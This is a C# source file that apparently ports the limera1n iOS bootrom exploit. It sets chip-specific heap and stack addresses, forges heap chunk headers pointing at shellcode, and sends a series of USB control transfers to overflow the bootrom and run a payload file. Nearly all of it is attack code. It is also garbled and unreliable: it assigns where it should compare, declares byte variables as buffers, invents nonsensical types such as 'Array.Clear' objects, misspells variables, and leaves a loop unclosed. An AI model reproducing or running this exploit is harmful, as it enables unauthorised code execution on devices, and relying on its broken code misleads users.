
using System;
using System.Data;
using System.IO;

using Alpine.Device;

namespace openra1n
{
		public class limera1n
	{
		static MobileDevice iDev = new MobileDevice(0x1222, MobileDevice.Verbrosity.Debug);

	uint i = 0;
	byte buf = 0x800;
	byte shellcode = 0x800;
	uint max_size = 0x24000;
	uint load_address = 0x84000000;
	uint stack_address = 0x84033F98;
	uint shellcode_address = 0x84023001;
	uint shellcode_length = 0;		
	string pyld = @"payload.bin";
	string cpid = "";
		

		Filestream payload = File.OpenRead(pyld);
		
		static Array.Clear memset = new Array.Clear();
		static Array.Copy memcpy = new Array.Copy();
		static Console.Write info = new Console.Write();
		
		public limera1n()
		{
			iDev.Connect();
			
		if (cpid = 8930) {
		max_size = 0x2C000;
		stack_address = 0x8403BF9C;
		shellcode_address = 0x8402B001;
	}
		if (cpid = 8920) {
		max_size = 0x24000;
		stack_address = 0x84033FA4;
		shellcode_address = 0x84023001;
	}
			memset(shellcode, 0x0, 0x800);
			shellcode_length = plyd.Length;
			memcpy(shellcode, plyd, plyd.Length);
		
			info("Reseting usb counters");
			memset(buf, 0xCC, 0x800);
		for(i = 0; i < 0x800; i += 0x40) {
			uint* heap = (uint*)(buf+i);
			heap[0] = 0x405;
			heap[1] = 0x101;
			heap[2] = shellcode_address;
			heap[3] = stack_address;
		}	
		info("Sending chunk headers\n");
		iDev.SendRaw(0x21, 1, 0, 0, buf, 0x800, 1000);
		
		memset(buf, 0xCC, 0x800);
		for(i = 0; i < (max_size - (0x800 * 3)); i += 0x800) {
		iDev.SendRaw(0x21, 1, 0, 0, buf, 0x800, 1000);
				
		info("Sending exploit payload\n");
		iDev.SendRaw(0x21, 1, 0, 0, shellcode, 0x800, 1000);

		info("Sending fake data\n");
		memset(buf, 0xBB, 0x800);
		iDev.SendRaw(0xA1, 1, 0, 0, buf, 0x800, 1000);
		iDev.SendRaw(0x21, 1, 0, 0, buf, 0x800, 10);

		iDev.SendRaw(0x21, 2, 0, 0, buf, 0, 1000);


	}

		}
		}
	}
